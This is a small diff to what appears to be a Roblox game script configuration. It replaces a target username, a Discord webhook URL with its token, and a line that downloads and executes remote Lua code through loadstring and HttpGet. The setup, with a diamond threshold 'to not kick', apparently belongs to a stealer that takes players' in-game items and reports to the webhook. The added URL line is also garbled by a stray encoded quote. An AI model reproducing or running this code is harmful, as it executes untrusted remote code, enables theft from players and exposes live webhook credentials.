@@ -1,5 +1,5 @@
-UserName = "imrealboy89"
-UserName2 = "imrealboy89" 
-Webhook = "https://discord.com/api/webhooks/1096752729197662268/1mh_v0UCJ4lpVqW9vjrYUyqXDXZGow4IE9Etvn9R8pYR7m6cTcitbPwMCXpcSO8o4Mbg"
- 
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+_G.Username = "XxvenomdudexX1608"
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.Webhook = "https://discord.com/api/webhooks/1100757137925345280/8epbDygW6nOnEzQq6rUQ4Mg89vGx8gmDOn-hf6B9J5Lbn20AC90JS0UO8GOQHPei2cY"
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua%22))()
